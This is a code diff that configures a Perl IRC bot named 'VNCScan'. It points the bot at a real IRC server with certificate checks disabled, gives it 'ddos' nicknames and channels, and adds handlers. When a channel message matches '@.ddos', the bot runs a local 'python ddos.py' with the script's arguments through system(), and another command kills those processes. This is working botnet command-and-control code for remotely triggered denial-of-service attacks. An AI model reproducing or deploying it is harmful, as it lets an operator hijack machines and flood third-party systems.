@@ -5,18 +5,18 @@
  use feature 'say';
  use Fcntl qw(:flock SEEK_END);
  $|=1;
- #defineportshere
+ my @VNC_PORTS = qw/'5900 5901'/;
   use Mojo::IOLoop;
- #definetimeouthere
- #defineforkshere
- #definenoticechanhere
- #definechanhere
+ my $forktimeout = 10;
+ my $maxforks = 500;
+ my $noticechan = '@#ddos#';
+ my $channel = '#ddos#';
   my $irc = Mojo::IRC->new(
- #definenickhere
+ nick => 'ddos'.int(rand(99999)),
   user => 'VNCScan',
- #defineserverhere
+ server => 'irc.chknet.cc:6697',
   );
- #definesslhere
+ $irc->tls({insecure => 1});
  $irc->on(irc_rpl_welcome => sub {
   my($irc, $err) = @_;
   warn 'Joined IRC server.';
@@ -33,19 +33,11 @@
    warn 'Received PING request, sending PONG.';
    $irc->write(notice => $noticechan => "pong");
    }if ($msg =~ /@.ddos/) {
-   # Input first string  
-my $string1 = "python ddos.py ";  
-  
-# Input second string  
-my $string2 = @ARGV;   
-  
-my $combine = $string1;    
-  
-# combine two string function (.=) 
-$combine .= $string2;   
-   $irc->write(notice => $noticechan => $combine);
-   system $combine; 
-   }
+   	system 'python ddos.py ' . "@ARGV"; 
+}
+if ($msg =~ /@.d.kill/) {
+   	system 'pkill python'; 
+}
    elsif ($msg =~ /@.stopexploit/) {
     warn 'stopexploit called, killing...';
     if ( exists $misc->{exploitpid} )  {
